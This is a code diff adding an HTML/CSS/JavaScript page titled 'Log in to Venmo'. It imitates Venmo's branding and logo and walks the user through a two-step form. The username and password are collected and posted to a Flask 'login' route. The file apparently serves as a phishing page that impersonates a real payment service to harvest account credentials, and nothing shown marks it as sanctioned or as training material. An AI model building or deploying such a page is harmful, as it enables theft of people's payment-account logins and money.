@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Venmo</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f4f7f9;
+            color: #0d2040;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 100vh;
+            padding: 40px 20px 24px;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 20px;
+            padding: 40px 32px 36px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Venmo Official Logo */
+        .logo-container {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 20px;
+        }
+
+        .venmo-logo {
+            width: 100%;
+            height: 100%;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0d2040;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #687b8c;
+            text-align: center;
+            margin-bottom: 28px;
+            line-height: 20px;
+        }
+
+        /* Views management */
+        .view {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .view.active {
+            display: flex;
+        }
+
+        .user-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #0d2040;
+            margin-bottom: 24px;
+            background-color: #f0f5fa;
+            padding: 8px 16px;
+            border-radius: 20px;
+        }
+
+        .edit-badge-btn {
+            color: #008cff;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        /* Forms */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 52px;
+            padding: 20px 16px 6px;
+            background-color: #ffffff;
+            border: 1px solid #ccd6e0;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            color: #0d2040;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #008cff;
+            box-shadow: 0 0 0 3px rgba(0, 140, 255, 0.15);
+        }
+
+        .input-label {
+            position: absolute;
+            left: 16px;
+            top: 16px;
+            font-size: 15px;
+            color: #687b8c;
+            pointer-events: none;
+            transition: all 0.15s ease;
+        }
+
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: 6px;
+            font-size: 12px;
+            color: #008cff;
+            font-weight: 600;
+        }
+
+        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label {
+            color: #687b8c;
+        }
+
+        .eye-btn {
+            position: absolute;
+            right: 14px;
+            top: 16px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #687b8c;
+            display: flex;
+            align-items: center;
+        }
+
+        .forgot-link {
+            font-size: 14px;
+            font-weight: 600;
+            color: #008cff;
+            text-decoration: none;
+            align-self: flex-start;
+            margin-top: 2px;
+            margin-bottom: 8px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Buttons */
+        .btn-primary {
+            width: 100%;
+            height: 50px;
+            background-color: #008cff;
+            border: none;
+            border-radius: 25px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 4px;
+        }
+
+        .btn-primary:hover {
+            background-color: #0074e4;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 20px 0;
+            color: #8fa0b0;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #e1e8f0;
+        }
+
+        .divider span {
+            padding: 0 12px;
+        }
+
+        .signup-text {
+            font-size: 14px;
+            color: #687b8c;
+            text-align: center;
+        }
+
+        .signup-text a {
+            color: #008cff;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer Links */
+        .footer-links {
+            display: flex;
+            gap: 20px;
+            font-size: 12px;
+            color: #8fa0b0;
+            margin-top: 32px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: #687b8c;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            color: #008cff;
+        }
+
+        /* Hidden field */
+        .hidden-field {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <main class="login-card">
+        <!-- Official Venmo 'V' Monogram Icon -->
+        <div class="logo-container">
+            <svg class="venmo-logo" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M444 32C455 48.7 460 67.5 460 91.3C460 160.7 398 293.7 348 377.3C303 452 254 512 201 512C167 512 144 492.7 132 464.7L68 64.7C63 32 83.3 0 118 0C142.7 0 163 15.3 169 38L211 289L311 118.7C324 93.3 323 76.7 314 62C303 44 280 38 253 38H223V0H424V32H444Z" fill="#008CFF"/>
+            </svg>
+        </div>
+
+        <h1 class="title">Log in to Venmo</h1>
+        <p class="subtitle" id="form-subtitle">Enter your email, phone, or username to get started.</p>
+
+        <!-- STEP 1: Email/Phone/Username Input -->
+        <div id="step-user" class="view active">
+            <form class="login-form" id="user-form">
+                <div class="input-group">
+                    <input type="text" id="user-input" class="input-field" placeholder=" " required autofocus />
+                    <label for="user-input" class="input-label">Email, phone, or username</label>
+                </div>
+
+                <button type="submit" class="btn-primary">Next</button>
+
+                <div class="divider">
+                    <span>or</span>
+                </div>
+
+                <div class="signup-text">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+            </form>
+        </div>
+
+        <!-- STEP 2: Password Input -->
+        <div id="step-password" class="view">
+            <div class="user-badge">
+                <span id="display-user">user@example.com</span>
+                <span class="edit-badge-btn" id="btn-edit-user">Edit</span>
+            </div>
+
+            <!-- PASSWORD FORM: posts identifier as username, password as password to Flask -->
+            <form class="login-form" id="password-form" action="{{ url_for('login') }}" method="POST">
+                <!-- Hidden field for identifier (username) -->
+                <input type="hidden" name="username" id="hidden-user" value="">
+
+                <div class="input-group">
+                    <input type="password" id="password-input" name="password" class="input-field" placeholder=" " required />
+                    <label for="password-input" class="input-label">Password</label>
+                    <button type="button" class="eye-btn" id="toggle-pwd" aria-label="Toggle password visibility">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+
+                <a href="#" class="forgot-link">Forgot password?</a>
+
+                <button type="submit" class="btn-primary">Log In</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer-links">
+        <a href="#">Security</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Contact Us</a>
+    </footer>
+
+    <script>
+        const userForm = document.getElementById('user-form');
+        const userInput = document.getElementById('user-input');
+        const displayUser = document.getElementById('display-user');
+        const formSubtitle = document.getElementById('form-subtitle');
+        
+        const stepUser = document.getElementById('step-user');
+        const stepPassword = document.getElementById('step-password');
+        const btnEditUser = document.getElementById('btn-edit-user');
+        const passwordInput = document.getElementById('password-input');
+        const togglePwd = document.getElementById('toggle-pwd');
+        const hiddenUser = document.getElementById('hidden-user');
+
+        // Transition from Username to Password Step
+        userForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const val = userInput.value.trim();
+            if (val) {
+                displayUser.textContent = val;
+                hiddenUser.value = val;      // set hidden field for submission
+                formSubtitle.textContent = 'Enter your password to log in.';
+                stepUser.classList.remove('active');
+                stepPassword.classList.add('active');
+                passwordInput.focus();
+            }
+        });
+
+        // Edit button action (Back to Step 1)
+        btnEditUser.addEventListener('click', () => {
+            formSubtitle.textContent = 'Enter your email, phone, or username to get started.';
+            stepPassword.classList.remove('active');
+            stepUser.classList.add('active');
+            userInput.focus();
+        });
+
+        // Password Visibility Toggle
+        togglePwd.addEventListener('click', () => {
+            const isPassword = passwordInput.getAttribute('type') === 'password';
+            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+        });
+    </script>
+
+</body>
+</html>
